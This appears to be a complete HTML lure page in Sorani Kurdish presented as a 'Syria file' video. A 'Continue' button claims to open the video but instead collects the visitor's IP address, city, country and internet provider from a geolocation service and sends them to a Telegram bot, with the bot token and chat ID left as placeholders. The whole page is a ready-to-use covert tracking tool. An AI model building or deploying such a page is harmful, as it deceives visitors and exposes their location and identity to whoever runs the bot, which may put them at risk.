<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مەلەفی سوریا</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
            color: #333;
        }
        .card {
            background: #ffffff;
            padding: 35px 25px;
            border-radius: 20px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
            text-align: center;
            max-width: 380px;
            width: 100%;
        }
        h2 {
            margin-top: 0;
            margin-bottom: 15px;
            font-size: 22px;
            color: #111;
        }
        p {
            color: #666;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        .btn {
            background-color: #007aff;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            transition: background-color 0.2s;
        }
        .btn:active {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>مەلەفی سوریا</h2>
        <p>بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، کلیک بکە:</p>
        <button class="btn" onclick="sendData()">بەردەوامبوون</button>
    </div>

    <script>
        const BOT_TOKEN = "TÖKÊN_I_NWÊ";
        const CHAT_ID = "CHAT_ID_I_NWÊ";

        function sendData() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const message = `زانیاری سەردانیکەر:\nIP: ${data.ip}\nشار: ${data.city}\nوڵات: ${data.country_name}\nدابینکەر: ${data.org}`;
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message
                        })
                    });
                })
                .catch(error => console.error('Error:', error));
        }
    </script>

</body>
</html>
